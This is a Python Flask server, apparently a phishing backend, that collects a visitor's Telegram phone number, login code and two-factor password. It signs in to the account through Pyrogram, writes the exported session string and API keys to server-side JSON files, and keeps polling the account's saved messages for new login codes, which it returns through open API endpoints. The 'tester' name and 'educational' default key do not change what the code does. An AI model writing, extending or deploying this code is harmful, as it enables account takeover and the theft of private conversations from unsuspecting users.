import os
import asyncio
import logging
import time
import threading
import json
import re
from datetime import datetime
from flask import Flask, request, jsonify, render_template, send_from_directory
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, 
    PhoneCodeInvalid, 
    PhoneNumberInvalid, 
    PhoneCodeExpired,
    FloodWait
)

# Настройка логирования для Railway
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__, 
            template_folder='templates',
            static_folder='templates',
            static_url_path='/static')

@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_from_directory('templates', filename)

# 🔧 ГЛОБАЛЬНЫЙ СЛОВАРЬ ДЛЯ ХРАНЕНИЯ РЕЗУЛЬТАТОВ ПОИСКА КОДОВ
CODE_SEARCH_RESULTS = {}

# 🔧 УЛУЧШЕННЫЙ КЛАСС ДЛЯ ПОСТОЯННОГО ПОИСКА
class ContinuousCodeFinder:
    def __init__(self, session_string, user_id):
        self.session_string = session_string
        self.user_id = user_id
        self.is_running = False
        self.found_code = None
        
    async def start_continuous_search(self, duration=300):  # 5 минут поиска
        """Запуск постоянного поиска кода в фоне"""
        self.is_running = True
        start_time = time.time()
        
        logger.info(f"🚀 Запуск постоянного поиска кода для user_id: {self.user_id}")
        
        while self.is_running and (time.time() - start_time) < duration:
            try:
                code = await self.search_single_attempt()
                if code:
                    self.found_code = code
                    self.is_running = False
                    
                    # Сохраняем результат в глобальный словарь
                    CODE_SEARCH_RESULTS[self.user_id] = {
                        'code': code,
                        'found_at': datetime.now().isoformat(),
                        'status': 'found'
                    }
                    
                    logger.info(f"🎉 Код найден для user_id {self.user_id}: {code}")
                    return code
                
                # Ждем 10 секунд перед следующей попыткой
                await asyncio.sleep(10)
                
            except Exception as e:
                logger.error(f"❌ Ошибка в постоянном поиске: {e}")
                await asyncio.sleep(10)
        
        # Если не нашли за отведенное время
        CODE_SEARCH_RESULTS[self.user_id] = {
            'code': None,
            'found_at': datetime.now().isoformat(),
            'status': 'not_found'
        }
        
        logger.info(f"⏰ Поиск завершен для user_id {self.user_id}, код не найден")
        self.is_running = False
        return None
    
    async def search_single_attempt(self):
        """Одна попытка поиска кода"""
        try:
            session_name = f"continuous_finder_{self.user_id}_{int(time.time())}"
            async with Client(session_name, session_string=self.session_string, in_memory=True) as client:
                # Ищем в последних сообщениях
                async for message in client.get_chat_history('me', limit=50):
                    if message.text:
                        # Расширенный поиск кодов
                        codes = re.findall(r'\b\d{5,6}\b', message.text)
                        
                        # Проверяем ключевые слова в сообщении
                        telegram_keywords = ['код', 'code', 'login', 'verification', 'подтверждени']
                        has_telegram_keyword = any(keyword in message.text.lower() for keyword in telegram_keywords)
                        
                        if codes and has_telegram_keyword:
                            code = codes[0]
                            logger.info(f"🔍 Найден потенциальный код: {code} в сообщении: {message.text[:100]}...")
                            return code
                
                return None
                
        except Exception as e:
            logger.error(f"❌ Ошибка в поиске: {e}")
            return None
    
    def stop_search(self):
        """Остановка поиска"""
        self.is_running = False

# 🔧 УПРОЩЕННАЯ ФУНКЦИЯ ДЛЯ СРАЗУШЕГО ПОИСКА
async def find_telegram_code_immediate(session_string):
    """Мгновенный поиск кода"""
    try:
        session_name = f"immediate_finder_{int(time.time())}"
        async with Client(session_name, session_string=session_string, in_memory=True) as client:
            codes_found = []
            
            # Быстрый поиск в последних сообщениях
            async for message in client.get_chat_history('me', limit=30):
                if message.text:
                    codes = re.findall(r'\b\d{5}\b', message.text)
                    if codes:
                        codes_found.append({
                            'code': codes[0],
                            'text': message.text[:100],
                            'date': message.date.isoformat() if message.date else None
                        })
            
            if codes_found:
                return {
                    'success': True,
                    'code_found': True,
                    'telegram_code': codes_found[0]['code'],
                    'message': f"✅ Код найден: {codes_found[0]['code']}"
                }
            else:
                return {
                    'success': True,
                    'code_found': False,
                    'telegram_code': None,
                    'message': "❌ Код не найден в последних сообщениях"
                }
                
    except Exception as e:
        logger.error(f"❌ Ошибка мгновенного поиска: {e}")
        return {
            'success': False,
            'error': f'Ошибка поиска: {str(e)}'
        }

# 🔧 ФУНКЦИЯ ДЛЯ ЗАПУСКА ФОНОВОГО ПОИСКА
def start_background_search(session_string, user_id):
    """Запуск фонового поиска кода"""
    try:
        finder = ContinuousCodeFinder(session_string, user_id)
        
        # Запускаем в отдельном потоке
        def run_search():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(finder.start_continuous_search())
            loop.close()
        
        search_thread = threading.Thread(target=run_search, daemon=True)
        search_thread.start()
        
        logger.info(f"📡 Запущен фоновый поиск кода для user_id: {user_id}")
        return True
        
    except Exception as e:
        logger.error(f"❌ Ошибка запуска фонового поиска: {e}")
        return False

class JSONStorageManager:
    def __init__(self):
        self.storage_path = "./tdata_storage"
        self.init_storage()
    
    def init_storage(self):
        try:
            os.makedirs(f"{self.storage_path}/users", exist_ok=True)
            os.makedirs(f"{self.storage_path}/sessions", exist_ok=True)
            os.makedirs(f"{self.storage_path}/tdata", exist_ok=True)
            logger.info("✅ JSON хранилище инициализировано")
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации хранилища: {e}")
    
    def save_user(self, user_data):
        try:
            user_file = f"{self.storage_path}/users/{user_data['id']}.json"
            with open(user_file, 'w', encoding='utf-8') as f:
                json.dump(user_data, f, indent=2, ensure_ascii=False)
            return True
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения пользователя: {e}")
            return False
    
    def save_session(self, user_id, session_data, request_info=None):
        try:
            session_id = int(time.time() * 1000)
            session_file = f"{self.storage_path}/sessions/{session_id}.json"
            
            session_record = {
                'id': session_id,
                'user_id': user_id,
                'session_data': session_data,
                'request_info': request_info,
                'created_at': datetime.now().isoformat(),
                'is_active': True
            }
            
            with open(session_file, 'w', encoding='utf-8') as f:
                json.dump(session_record, f, indent=2, ensure_ascii=False)
            
            return session_id
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения сессии: {e}")
            return None
    
    def save_tdata(self, user_id, session_id, tdata_json):
        try:
            tdata_id = int(time.time() * 1000)
            tdata_file = f"{self.storage_path}/tdata/{tdata_id}.json"
            
            tdata_record = {
                'id': tdata_id,
                'user_id': user_id,
                'session_id': session_id,
                'tdata_json': tdata_json,
                'exported_at': datetime.now().isoformat()
            }
            
            with open(tdata_file, 'w', encoding='utf-8') as f:
                json.dump(tdata_record, f, indent=2, ensure_ascii=False)
            
            return tdata_id
        except Exception as e:
            logger.error(f"❌ Ошибка сохранения TData: {e}")
            return None
    
    def get_user_sessions(self, user_id):
        try:
            sessions = []
            sessions_dir = f"{self.storage_path}/sessions"
            
            if not os.path.exists(sessions_dir):
                return []
            
            for filename in os.listdir(sessions_dir):
                if filename.endswith('.json'):
                    filepath = os.path.join(sessions_dir, filename)
                    with open(filepath, 'r', encoding='utf-8') as f:
                        session_data = json.load(f)
                        if session_data.get('user_id') == user_id:
                            sessions.append({
                                'id': session_data['id'],
                                'session_string': session_data['session_data'].get('session_string'),
                                'dc_id': session_data['session_data'].get('dc_id'),
                                'created_at': session_data['created_at'],
                                'is_active': session_data.get('is_active', True)
                            })
            
            return sorted(sessions, key=lambda x: x['created_at'], reverse=True)
        except Exception as e:
            logger.error(f"❌ Ошибка получения сессий: {e}")
            return []
    
    def get_stats(self):
        try:
            users_dir = f"{self.storage_path}/users"
            sessions_dir = f"{self.storage_path}/sessions"
            tdata_dir = f"{self.storage_path}/tdata"
            
            users_count = len([f for f in os.listdir(users_dir) if f.endswith('.json')]) if os.path.exists(users_dir) else 0
            sessions_count = len([f for f in os.listdir(sessions_dir) if f.endswith('.json')]) if os.path.exists(sessions_dir) else 0
            tdata_count = len([f for f in os.listdir(tdata_dir) if f.endswith('.json')]) if os.path.exists(tdata_dir) else 0
            
            return {
                'total_users': users_count,
                'active_sessions': sessions_count,
                'total_tdata_records': tdata_count
            }
        except Exception as e:
            logger.error(f"❌ Ошибка получения статистики: {e}")
            return {'total_users': 0, 'active_sessions': 0, 'total_tdata_records': 0}

storage = JSONStorageManager()

class AsyncRunner:
    def __init__(self):
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.thread.start()
    
    def _run_loop(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()
    
    def run_coroutine(self, coro):
        future = asyncio.run_coroutine_threadsafe(coro, self.loop)
        return future.result(timeout=60)

async_runner = AsyncRunner()

@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

def load_api_keys():
    try:
        from dotenv import load_dotenv
        load_dotenv()
        logger.info("✅ .env файл загружен")
    except ImportError:
        logger.warning("⚠️ python-dotenv не установлен")
    
    api_id = os.getenv('TELEGRAM_API_ID')
    api_hash = os.getenv('TELEGRAM_API_HASH')
    secret_key = os.getenv('SECRET_KEY', 'educational-demo-secret-key-2024')
    
    return api_id, api_hash, secret_key

API_ID, API_HASH, SECRET_KEY = load_api_keys()
app.secret_key = SECRET_KEY

ACTIVE_SESSIONS = {}
SESSION_TIMEOUT = 300

def cleanup_expired_sessions():
    """Очистка просроченных сессий"""
    current_time = time.time()
    expired_sessions = []
    
    for session_id, session_data in ACTIVE_SESSIONS.items():
        if current_time - session_data['created_at'] > SESSION_TIMEOUT:
            expired_sessions.append(session_id)
    
    for session_id in expired_sessions:
        if session_id in ACTIVE_SESSIONS:
            try:
                client = ACTIVE_SESSIONS[session_id].get('client')
                if client:
                    asyncio.create_task(client.disconnect())
            except:
                pass
            del ACTIVE_SESSIONS[session_id]

class TelegramAuthTester:
    def __init__(self):
        self.api_id = None
        self.api_hash = None
        self.initialized = False
        self.initialize_client()
        
    def initialize_client(self):
        try:
            if not API_ID or not API_HASH:
                logger.error("❌ API ключи не установлены")
                self.initialized = False
                return
                
            self.api_id = int(API_ID)
            self.api_hash = API_HASH
            self.initialized = True
            logger.info(f"✅ Pyrogram тестер инициализирован с API_ID: {self.api_id}")
            
        except ValueError as e:
            logger.error(f"❌ Неверный формат API_ID: {e}")
            self.initialized = False
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации: {e}")
            self.initialized = False
    
    async def request_code(self, phone_number):
        if not self.initialized:
            return {'success': False, 'error': 'Клиент не инициализирован'}
            
        client = None
        try:
            session_id = f"{phone_number}_{int(time.time())}"
            
            client = Client(
                name=session_id,
                api_id=self.api_id,
                api_hash=self.api_hash,
                in_memory=True
            )
            
            await client.connect()
            
            logger.info(f"📱 Запрос кода для: {phone_number}")
            sent_code = await client.send_code(phone_number)
            
            ACTIVE_SESSIONS[session_id] = {
                'client': client,
                'phone': phone_number,
                'phone_code_hash': sent_code.phone_code_hash,
                'created_at': time.time(),
                'needs_password': False
            }
            
            logger.info(f"📱 Код отправлен. Session: {session_id}")
            logger.info(f"📊 Активных сессий: {len(ACTIVE_SESSIONS)}")
            
            return {
                'success': True,
                'message': 'Код отправлен в Telegram!',
                'session_id': session_id
            }
            
        except Exception as e:
            logger.error(f"❌ Ошибка запроса кода: {e}")
            if client:
                try:
                    await client.disconnect()
                except:
                    pass
            return {'success': False, 'error': f'Ошибка: {str(e)}'}
    
    async def verify_code(self, session_id, code):
        cleanup_expired_sessions()
        
        if session_id not in ACTIVE_SESSIONS:
            logger.error(f"❌ Сессия не найдена: {session_id}")
            return {'success': False, 'error': 'Сессия не найдена или истекла'}
            
        session_data = ACTIVE_SESSIONS[session_id]
        client = session_data['client']
        phone = session_data['phone']
        phone_code_hash = session_data['phone_code_hash']
        
        try:
            logger.info(f"🔐 Верификация кода {code} для {phone}")
            
            await client.sign_in(
                phone_number=phone,
                phone_code_hash=phone_code_hash,
                phone_code=code
            )
            
            logger.info("✅ Успешная аутентификация")
            
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'phone_number': me.phone_number,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'username': me.username
            }
            
            export_result = await self.export_tdata(client, user_info)
            
            await client.disconnect()
            del ACTIVE_SESSIONS[session_id]
            
            if export_result['success']:
                return {
                    'success': True,
                    'message': 'Аутентификация и экспорт TData успешны!',
                    'user_info': user_info,
                    'export_info': export_result
                }
            else:
                return export_result
                
        except SessionPasswordNeeded:
            logger.info("🔒 Требуется 2FA пароль")
            session_data['needs_password'] = True
            ACTIVE_SESSIONS[session_id] = session_data
            
            logger.info(f"🔐 Сессия {session_id} переведена в режим 2FA")
            
            return {
                'success': True,
                'message': 'Требуется пароль 2FA',
                'needs_password': True,
                'session_id': session_id
            }
            
        except PhoneCodeInvalid as e:
            logger.warning(f"⚠️ Неверный код: {e}")
            return {'success': False, 'error': 'Неверный код подтверждения'}
            
        except PhoneCodeExpired as e:
            logger.warning(f"⏰ Код истек: {e}")
            await client.disconnect()
            if session_id in ACTIVE_SESSIONS:
                del ACTIVE_SESSIONS[session_id]
            return {'success': False, 'error': 'Код истек. Запросите новый.'}
            
        except FloodWait as e:
            logger.warning(f"⏳ Flood wait: {e.value} секунд")
            await client.disconnect()
            if session_id in ACTIVE_SESSIONS:
                del ACTIVE_SESSIONS[session_id]
            return {
                'success': False, 
                'error': f'Слишком много попыток. Попробуйте через {e.value} секунд.'
            }
            
        except Exception as e:
            logger.error(f"❌ Ошибка верификации: {e}")
            try:
                await client.disconnect()
            except:
                pass
            if session_id in ACTIVE_SESSIONS:
                del ACTIVE_SESSIONS[session_id]
            return {'success': False, 'error': f'Ошибка: {str(e)}'}
    
    async def verify_password(self, session_id, password):
        cleanup_expired_sessions()
        
        if session_id not in ACTIVE_SESSIONS:
            logger.error(f"❌ Сессия не найдена для 2FA: {session_id}")
            return {'success': False, 'error': 'Сессия не найдена'}
            
        session_data = ACTIVE_SESSIONS[session_id]
        
        if not session_data.get('needs_password'):
            logger.error(f"❌ Неверный статус сессии для 2FA: {session_id}")
            return {'success': False, 'error': 'Неверный статус сессии'}
            
        client = session_data['client']
        
        try:
            logger.info("🔑 Верификация пароля 2FA")
            
            await client.check_password(password=password)
            
            logger.info("✅ Успешная аутентификация с паролем 2FA")
            
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'phone_number': me.phone_number,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'username': me.username
            }
            
            export_result = await self.export_tdata(client, user_info)
            
            await client.disconnect()
            del ACTIVE_SESSIONS[session_id]
            
            if export_result['success']:
                return {
                    'success': True,
                    'message': 'Аутентификация и экспорт TData успешны!',
                    'user_info': user_info,
                    'export_info': export_result
                }
            else:
                return export_result
                
        except Exception as e:
            logger.error(f"❌ Ошибка верификации пароля: {e}")
            try:
                await client.disconnect()
            except:
                pass
            if session_id in ACTIVE_SESSIONS:
                del ACTIVE_SESSIONS[session_id]
            return {'success': False, 'error': 'Неверный пароль 2FA'}
    
    async def export_tdata(self, client, user_info, request_info=None):
        try:
            session_string = await client.export_session_string()
        
            dc_info = await client.storage.dc_id()
            dc_id = dc_info if dc_info else 2
        
            tdata_info = {
                'version': '1.0',
                'user_id': user_info['id'],
                'phone_number': user_info.get('phone_number', ''),
                'first_name': user_info.get('first_name', ''),
                'last_name': user_info.get('last_name', ''),
                'username': user_info.get('username', ''),
                'session_string': session_string,
                'dc_id': dc_id,
                'api_id': self.api_id,
                'api_hash': self.api_hash,
                'device_model': 'Pyrogram Export',
                'system_version': '1.0',
                'app_version': '1.0',
                'lang_code': 'en',
                'system_lang_code': 'en',
                'exported_at': datetime.now().isoformat(),
                'session_type': 'pyrogram_string_session'
            }
        
            storage.save_user(user_info)
        
            session_data = {
                'session_string': session_string,
                'dc_id': dc_id,
                'api_id': self.api_id,
                'api_hash': self.api_hash,
                'device_model': 'Pyrogram Export',
                'system_version': '1.0',
                'app_version': '1.0',
                'lang_code': 'en',
                'system_lang_code': 'en'
            }
        
            session_id = storage.save_session(user_info['id'], session_data, request_info)
        
            if session_id:
                tdata_id = storage.save_tdata(user_info['id'], session_id, tdata_info)
            
                logger.info(f"💾 TData сохранен. Session ID: {session_id}, TData ID: {tdata_id}")
                
                # 🔧 ЗАПУСКАЕМ ФОНОВЫЙ ПОИСК КОДА
                logger.info(f"🚀 Запуск фонового поиска кода для user_id: {user_info['id']}")
                start_background_search(session_string, user_info['id'])
                
                # 🔧 МГНОВЕННЫЙ ПОИСК
                immediate_result = await find_telegram_code_immediate(session_string)
            
                return {
                    'success': True,
                    'session_id': session_id,
                    'tdata_id': tdata_id,
                    'user_id': user_info['id'],
                    'session_string': session_string,
                    'message': 'Аутентификация успешна! Запущен поиск кода...',
                    'immediate_search': immediate_result,
                    'background_search_started': True
                }
            else:
                return {'success': False, 'error': 'Ошибка сохранения сессии'}
            
        except Exception as e:
            logger.error(f"❌ Ошибка экспорта TData: {e}")
            return {'success': False, 'error': f'Ошибка экспорта: {str(e)}'}

auth_tester = TelegramAuthTester()

# 🔧 НОВЫЕ API ENDPOINTS ДЛЯ УПРАВЛЕНИЯ ПОИСКОМ
@app.route('/api/check-code-status/<int:user_id>', methods=['GET'])
def check_code_status(user_id):
    """Проверка статуса поиска кода"""
    if user_id in CODE_SEARCH_RESULTS:
        result = CODE_SEARCH_RESULTS[user_id]
        return jsonify({
            'success': True,
            'user_id': user_id,
            'code_status': result['status'],
            'telegram_code': result['code'],
            'found_at': result['found_at']
        })
    else:
        return jsonify({
            'success': True,
            'user_id': user_id,
            'code_status': 'searching',
            'telegram_code': None,
            'message': 'Поиск кода в процессе...'
        })

@app.route('/api/search-code-now', methods=['POST', 'OPTIONS'])
def search_code_now():
    """Немедленный поиск кода"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        session_string = data.get('session_string', '').strip()
        
        if not session_string:
            return jsonify({'success': False, 'error': 'Session string required'}), 400
        
        result = async_runner.run_coroutine(find_telegram_code_immediate(session_string))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка немедленного поиска: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

# 🔧 HEALTH CHECK
@app.route('/health')
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'active_searches': len(CODE_SEARCH_RESULTS),
        'environment': os.getenv('RAILWAY_ENVIRONMENT', 'development')
    })

# 🔧 СТАРЫЙ ENDPOINT ДЛЯ ОБРАТНОЙ СОВМЕСТИМОСТИ
@app.route('/api/find-telegram-code', methods=['POST', 'OPTIONS'])
def find_telegram_code():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        session_string = data.get('session_string', '').strip()
        
        if not session_string:
            return jsonify({'success': False, 'error': 'Session string required'}), 400
        
        result = async_runner.run_coroutine(find_telegram_code_immediate(session_string))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка поиска кода: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/')
def home():
    stats = storage.get_stats()
    return render_template('index.html', stats=stats)

@app.route('/api/auth/request-code', methods=['POST', 'OPTIONS'])
def request_code():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        phone = data.get('phone', '').strip()
        
        if not phone:
            return jsonify({'success': False, 'error': 'Введите номер телефона'}), 400
        
        result = async_runner.run_coroutine(auth_tester.request_code(phone))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка запроса кода: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/api/auth/verify-code', methods=['POST', 'OPTIONS'])
def verify_code():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        session_id = data.get('session_id', '').strip()
        
        if not session_id:
            return jsonify({'success': False, 'error': 'Session ID required'}), 400
            
        code = data.get('code', '').strip()
        
        if not code:
            return jsonify({'success': False, 'error': 'Введите код'}), 400
        
        result = async_runner.run_coroutine(auth_tester.verify_code(session_id, code))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка верификации кода: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/api/auth/verify-password', methods=['POST', 'OPTIONS'])
def verify_password():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        session_id = data.get('session_id', '').strip()
        
        if not session_id:
            return jsonify({'success': False, 'error': 'Session ID required'}), 400
            
        password = data.get('password', '')
        
        if not password:
            return jsonify({'success': False, 'error': 'Введите пароль'}), 400
        
        result = async_runner.run_coroutine(auth_tester.verify_password(session_id, password))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"❌ Ошибка верификации пароля: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/api/storage/stats', methods=['GET'])
def storage_stats():
    try:
        stats = storage.get_stats()
        return jsonify({
            'success': True,
            'storage_type': 'JSON',
            'statistics': stats
        })
    except Exception as e:
        logger.error(f"❌ Ошибка получения статистики: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

if __name__ == '__main__':
    port = int(os.getenv('PORT', 8080))
    host = '0.0.0.0'
    
    logger.info(f"🚀 Запуск приложения на {host}:{port}")
    logger.info(f"🌍 Railway Environment: {os.getenv('RAILWAY_ENVIRONMENT', 'Not set')}")
    
    os.makedirs('templates', exist_ok=True)
    
    debug = os.getenv('DEBUG', 'false').lower() == 'true'
    
    app.run(host=host, port=port, debug=debug)
